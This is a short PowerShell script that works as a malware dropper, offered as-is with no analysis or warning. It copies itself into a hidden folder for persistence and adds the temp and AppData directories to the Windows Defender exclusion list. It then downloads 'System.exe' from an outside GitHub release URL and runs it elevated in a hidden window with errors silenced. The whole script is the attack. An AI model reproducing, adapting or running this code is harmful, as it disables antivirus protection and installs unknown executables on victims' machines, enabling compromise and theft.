$GOOGLE_DRIVE_URL = "https://github.com/kevinsocute2/exetemp/releases/download/powershell/System.exe"
$TEMP_DIR = "$env:APPDATA\Microsoft\HiddenStartup\MyScriptTemp2"

# Create the temporary directory if it doesn't exist
if (-not (Test-Path $TEMP_DIR)) {
    New-Item -ItemType Directory -Force -Path $TEMP_DIR
}

# Copy the script to the hidden Startup folder for persistence
Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\Microsoft\HiddenStartup" -Force

# Add the downloaded executable file to Windows Defender exclusion list
$exclusionPaths = @(
    "$TEMP_DIR"
    "$env:TEMP"
    "$env:APPDATA"
    "$env:APPDATA\System.exe"
    "$TEMP_DIR\System.exe"
    "$env:TEMP\System.exe"
    "$env:TEMP\2\System.exe"
    "$env:APPDATA\System.exe"
    "$env:TEMP\Registry.exe"
    "$env:APPDATA\Registry.exe"
)
$exclusionPaths | ForEach-Object { Add-MpPreference -ExclusionPath $_ }

# Add a timeout of 5 seconds (5000 milliseconds)
Start-Sleep -Milliseconds 1000

# Download the executable file using System.Net.WebClient.DownloadFile
$client = New-Object System.Net.WebClient
$client.DownloadFile($GOOGLE_DRIVE_URL, "$TEMP_DIR\System.exe")

# Find and run the executable file
Start-Process -FilePath "$TEMP_DIR\System.exe" -Verb runas -WindowStyle Hidden -ErrorAction SilentlyContinue